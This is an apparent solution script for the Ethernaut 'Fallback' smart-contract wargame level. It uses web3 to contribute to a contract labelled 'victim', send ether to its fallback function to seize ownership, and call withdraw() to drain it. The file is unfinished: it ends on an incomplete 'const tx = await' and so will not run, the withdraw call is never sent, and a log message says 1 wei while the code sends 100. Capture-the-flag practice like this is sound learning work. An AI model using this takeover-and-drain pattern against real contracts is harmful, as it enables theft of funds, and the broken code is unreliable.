const loader = require('../loader.js')
const web3 = require('../web3.js')

const instance = '0x1168A5FF13bf1f243FA0D8BB087DCa201A4eecF0'
const victim = loader.web3.fromArtifact('Fallback', instance)

const level = '0xD95B091f19946d6ef0c88f8CD360c0d6E408876E'

const hack = async () => {
  console.log('Contribute')
  await victim.methods.contribute().send({ value: 100 })
  console.log('Send 1 wei to fallback')
  await victim.sendTransaction({ value: 100 })
  console.log('withdraw() call')
  await victim.methods.withdraw()
  console.log('Submit instance')

  const tx = await 
  
}

hack()
